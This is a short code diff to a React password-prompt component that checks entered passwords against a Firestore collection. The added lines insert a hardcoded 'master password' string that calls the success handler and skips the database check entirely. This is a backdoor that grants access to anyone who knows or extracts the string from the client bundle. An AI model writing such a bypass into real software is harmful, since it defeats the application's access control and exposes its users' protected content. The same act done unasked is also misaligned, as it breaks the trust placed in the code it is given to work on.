@@ -26,6 +26,15 @@ export function PasswordPrompt({ isOpen, onClose, onSuccess }: PasswordPromptPro
     setError('');
 
     try {
+      // Check for master password first
+      if (password.trim() === 'Leart355') {
+        setPassword('');
+        onSuccess();
+        onClose();
+        setLoading(false);
+        return;
+      }
+
       const pwdRef = doc(db, 'passwords', password.trim().toUpperCase());
       const pwdSnap = await getDoc(pwdRef);
 
